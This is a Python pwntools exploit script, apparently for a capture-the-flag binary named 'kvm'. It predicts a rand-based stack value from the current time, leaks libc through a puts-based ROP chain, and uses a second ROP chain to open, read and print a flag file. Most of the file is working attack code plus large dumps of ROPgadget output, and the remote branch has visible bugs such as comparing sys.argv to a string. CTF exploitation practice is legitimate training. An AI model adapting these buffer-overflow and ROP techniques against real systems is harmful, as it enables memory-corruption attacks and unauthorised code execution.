from pwn import *
from time import sleep
from ctypes import CDLL
import sys

context.arch = 'amd64'
elf = ELF("./kvm")

if sys.argv[1] == 'l':
	io = process("./kvm")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	L = CDLL("/lib/x86_64-linux-gnu/libc-2.23.so")
	L.srand(L.time(0))
	pop_rdi_ret = 0x401583
	pop_rsi_r15_ret = 0x401581
	pop_rdx_rsi_ret = 0x1150c9
	pop_rsi_ret = 0x202e8
	#gdb.attach(io,'''handle SIGALRM nostop noprint\nb* 0x401331\nc\n''')
elif sys.argv == 'r':
	#io =remote()
	io = process("./kvm",env = {"LD_PRELOAD":"./libc.so.6"})
	'''
	Assumed that the remote machine was limmited by `chroot`, but author said no. So...we have no need to bypass chroot :) 
	'''
else:
	info("INVALID ARG")
	exit()

pio_shellcode = asm("mov al,%d;out 0x34,al;mov al,%d;out 0x34,al;mov al,%d;out 0x34,al;mov al,%d;out 0x34,al;"%(ord('f'),ord('l'),ord('a'),ord('g')))

io.recv()
io.send(pio_shellcode)

rop1 = 'a'*0x58
rop1 += p64(L.rand())
rop1 += 'b'*8
rop1 += p64(pop_rdi_ret)
rop1 += p64(elf.got['puts'])
rop1 += p64(elf.plt['puts'])
rop1 += p64(pop_rdi_ret)
rop1 += p64(0)
rop1 += p64(pop_rsi_r15_ret)
rop1 += p64(0x602100)
rop1 += p64(0)
rop1 += p64(elf.plt['read'])
rop1 += p64(0x4009d0)

io.recv()
io.send(rop1)
libc_base = u64(io.recv(6).ljust(8,'\x00'))-libc.sym['puts']

success("LIBC BASE -> %#x"%libc_base)

io.sendline("./flag\x00")

L.srand(L.time(0))

io.recvuntil("ing: \n")
io.sendline(pio_shellcode)

pop_rdx_rsi_ret = libc_base + pop_rdx_rsi_ret
pop_rsi_ret = libc_base + pop_rsi_ret
rop2 = 'a'*0x58
rop2 += p64(L.rand())
rop2 += 'b'*8
rop2 += p64(pop_rdi_ret)
rop2 += p64(0x602100)
rop2 += p64(pop_rsi_ret)
rop2 += p64(0)
rop2 += p64(elf.plt['open'])
rop2 += p64(pop_rdi_ret)
rop2 += p64(9)
rop2 += p64(pop_rdx_rsi_ret)
rop2 += p64(0x50)+p64(0x602200)
rop2 += p64(elf.plt['read'])
rop2 += p64(pop_rdi_ret)
rop2 += p64(0x602200)
rop2 += p64(elf.plt['puts'])
rop2 += p64(elf.plt['exit'])

io.recv()
io.sendline(rop2)

success("FLAG:"+io.recv())

'''
Gadgets information
============================================================
0x000000000040157c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040157e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401580 : pop r14 ; pop r15 ; ret
0x0000000000401582 : pop r15 ; ret
0x000000000040157b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040157f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400a30 : pop rbp ; ret
0x0000000000401583 : pop rdi ; ret
0x0000000000401581 : pop rsi ; pop r15 ; ret
0x000000000040157d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040028b : ret
0x0000000000401296 : ret 0x2be
0x0000000000400b48 : ret 0x8948
0x0000000000400c4e : ret 0x8b48
0x00000000004011c3 : ret 0xc600

'''
'''
Gadgets information
============================================================
0x00000000001306b5 : pop r10 ; ret
0x000000000002219c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000021558 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000007dd29 : pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x0000000000023e65 : pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000042865 : pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000021a43 : pop r12 ; pop r13 ; ret
0x00000000000d1199 : pop r12 ; pop r14 ; ret
0x00000000000e2fdd : pop r12 ; pop rbp ; ret
0x0000000000023992 : pop r12 ; ret
0x000000000002219e : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000002155a : pop r13 ; pop r14 ; pop r15 ; ret
0x000000000007dd2b : pop r13 ; pop r14 ; pop rbp ; ret
0x0000000000023e67 : pop r13 ; pop r14 ; ret
0x0000000000042867 : pop r13 ; pop rbp ; ret
0x0000000000021a45 : pop r13 ; ret
0x00000000000221a0 : pop r14 ; pop r15 ; pop rbp ; ret
0x000000000002155c : pop r14 ; pop r15 ; ret
0x000000000007dd2d : pop r14 ; pop rbp ; ret
0x0000000000023e69 : pop r14 ; ret
0x00000000000221a2 : pop r15 ; pop rbp ; ret
0x000000000002155e : pop r15 ; ret
0x0000000000150077 : pop rax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000021351 : pop rax ; pop rbx ; pop rbp ; ret
0x00000000001663b1 : pop rax ; pop rdx ; pop rbx ; ret
0x00000000000439c8 : pop rax ; ret
0x00000000001cf9a0 : pop rax ; ret 0
0x00000000001c7788 : pop rax ; ret 0xffe8
0x000000000003506c : pop rax ; ret 0xfffe
0x0000000000021557 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000023e64 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000021a42 : pop rbp ; pop r12 ; pop r13 ; ret
0x00000000000d1198 : pop rbp ; pop r12 ; pop r14 ; ret
0x0000000000023991 : pop rbp ; pop r12 ; ret
0x000000000002219f : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000002155b : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000007dd2c : pop rbp ; pop r14 ; pop rbp ; ret
0x0000000000023e68 : pop rbp ; pop r14 ; ret
0x0000000000042868 : pop rbp ; pop rbp ; ret
0x0000000000052bc8 : pop rbp ; pop rbx ; ret
0x0000000000021353 : pop rbp ; ret
0x00000000000a7e9d : pop rbp ; ret 0xffff
0x000000000007dd28 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x0000000000042864 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00000000000e2fdc : pop rbx ; pop r12 ; pop rbp ; ret
0x000000000002bf1c : pop rbx ; pop r12 ; ret
0x0000000000199657 : pop rbx ; pop r14 ; ret
0x0000000000023e63 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000021a41 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000000d1197 : pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret
0x0000000000023990 : pop rbx ; pop rbp ; pop r12 ; ret
0x00000000000c7be4 : pop rbx ; pop rbp ; pop r14 ; ret
0x0000000000021352 : pop rbx ; pop rbp ; ret
0x000000000002cb49 : pop rbx ; ret
0x0000000000001b18 : pop rbx ; ret 0x2a63
0x00000000001ad540 : pop rbx ; ret 0x6f9
0x000000000015eb9f : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000011c59b : pop rcx ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000103cca : pop rcx ; pop rbx ; ret
0x0000000000001b17 : pop rcx ; pop rbx ; ret 0x2a63
0x000000000003eb0b : pop rcx ; ret
0x00000000000221a3 : pop rdi ; pop rbp ; ret
0x000000000002155f : pop rdi ; ret
0x000000000005b4fd : pop rdi ; ret 0x38
0x00000000001306b4 : pop rdx ; pop r10 ; ret
0x000000000011c65c : pop rdx ; pop rbx ; ret
0x0000000000103cc9 : pop rdx ; pop rcx ; pop rbx ; ret
0x00000000001306d9 : pop rdx ; pop rsi ; ret
0x0000000000001b96 : pop rdx ; ret
0x0000000000100972 : pop rdx ; ret 0xffff
0x00000000000221a1 : pop rsi ; pop r15 ; pop rbp ; ret
0x000000000002155d : pop rsi ; pop r15 ; ret
0x000000000007dd2e : pop rsi ; pop rbp ; ret
0x0000000000023e6a : pop rsi ; ret
0x000000000002219d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000021559 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000007dd2a : pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret
0x0000000000023e66 : pop rsp ; pop r13 ; pop r14 ; ret
0x0000000000042866 : pop rsp ; pop r13 ; pop rbp ; ret
0x0000000000021a44 : pop rsp ; pop r13 ; ret
0x00000000000d119a : pop rsp ; pop r14 ; ret
0x00000000000e2fde : pop rsp ; pop rbp ; ret
0x0000000000003960 : pop rsp ; ret
0x0000000000003281 : pop rsp ; ret 0x52c0
0x0000000000003732 : pop rsp ; ret 0xf84d
0x00000000001d8d84 : pop rsp ; ret 0xfff4
0x00000000000008aa : ret

'''

'''
Gadgets information
============================================================
0x00000000000dbee5 : pop qword ptr [rsi - 0x77000000] ; ret 0xd139
0x00000000001150a5 : pop r10 ; ret
0x000000000002024f : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000000210fb : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000cd6b2 : pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x00000000000202e3 : pop r12 ; pop r13 ; pop r14 ; ret
0x000000000006d125 : pop r12 ; pop r13 ; pop rbp ; ret
0x00000000000206c2 : pop r12 ; pop r13 ; ret
0x00000000000b65d4 : pop r12 ; pop r14 ; ret
0x00000000000398c6 : pop r12 ; pop rbp ; ret
0x000000000001fb12 : pop r12 ; ret
0x0000000000020251 : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000000210fd : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000cd6b4 : pop r13 ; pop r14 ; pop rbp ; ret
0x00000000000202e5 : pop r13 ; pop r14 ; ret
0x000000000006d127 : pop r13 ; pop rbp ; ret
0x00000000000206c4 : pop r13 ; ret
0x0000000000020253 : pop r14 ; pop r15 ; pop rbp ; ret
0x00000000000210ff : pop r14 ; pop r15 ; ret
0x00000000000cd6b6 : pop r14 ; pop rbp ; ret
0x00000000000202e7 : pop r14 ; ret
0x0000000000020255 : pop r15 ; pop rbp ; ret
0x0000000000021101 : pop r15 ; ret
0x000000000001f92e : pop rax ; pop rbx ; pop rbp ; ret
0x00000000001435b1 : pop rax ; pop rdx ; pop rbx ; ret
0x0000000000033544 : pop rax ; ret
0x00000000000caabc : pop rax ; ret 0x2f
0x00000000000210fa : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000202e2 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000000206c1 : pop rbp ; pop r12 ; pop r13 ; ret
0x00000000000b65d3 : pop rbp ; pop r12 ; pop r14 ; ret
0x000000000001fb11 : pop rbp ; pop r12 ; ret
0x000000000012cb06 : pop rbp ; pop r13 ; pop r14 ; ret
0x0000000000020252 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000000210fe : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000000cd6b5 : pop rbp ; pop r14 ; pop rbp ; ret
0x00000000000202e6 : pop rbp ; pop r14 ; ret
0x000000000006d128 : pop rbp ; pop rbp ; ret
0x0000000000048438 : pop rbp ; pop rbx ; ret
0x000000000001f930 : pop rbp ; ret
0x0000000000088e1f : pop rbp ; ret 8
0x00000000000cd6b1 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x000000000006d124 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00000000000398c5 : pop rbx ; pop r12 ; pop rbp ; ret
0x00000000000202e1 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000000206c0 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000000b65d2 : pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret
0x000000000001fb10 : pop rbx ; pop rbp ; pop r12 ; ret
0x000000000012cb05 : pop rbx ; pop rbp ; pop r13 ; pop r14 ; ret
0x000000000001f92f : pop rbx ; pop rbp ; ret
0x000000000002a69a : pop rbx ; ret
0x0000000000001b18 : pop rbx ; ret 0x2a63
0x0000000000185e20 : pop rbx ; ret 0x6f9
0x000000000013cc0f : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000101f3b : pop rcx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000000ea69a : pop rcx ; pop rbx ; ret
0x0000000000001b17 : pop rcx ; pop rbx ; ret 0x2a63
0x00000000001419e3 : pop rcx ; ret 0xffee
0x0000000000020256 : pop rdi ; pop rbp ; ret
0x0000000000021102 : pop rdi ; ret
0x0000000000067499 : pop rdi ; ret 0xffff
0x00000000001150a4 : pop rdx ; pop r10 ; ret
0x0000000000101ffc : pop rdx ; pop rbx ; ret
0x00000000000ea699 : pop rdx ; pop rcx ; pop rbx ; ret
0x00000000001150c9 : pop rdx ; pop rsi ; ret
0x0000000000001b92 : pop rdx ; ret
0x0000000000020254 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000021100 : pop rsi ; pop r15 ; ret
0x00000000000cd6b7 : pop rsi ; pop rbp ; ret
0x00000000000202e8 : pop rsi ; ret
0x0000000000101dbb : pop rsi ; ret 0xcdbb
0x0000000000020250 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000000210fc : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000cd6b3 : pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret
0x00000000000202e4 : pop rsp ; pop r13 ; pop r14 ; ret
0x000000000006d126 : pop rsp ; pop r13 ; pop rbp ; ret
0x00000000000206c3 : pop rsp ; pop r13 ; ret
0x00000000000b65d5 : pop rsp ; pop r14 ; ret
0x00000000000398c7 : pop rsp ; pop rbp ; ret
0x0000000000003838 : pop rsp ; ret
0x000000000000318d : pop rsp ; ret 0x52c0
0x0000000000000937 : ret

'''
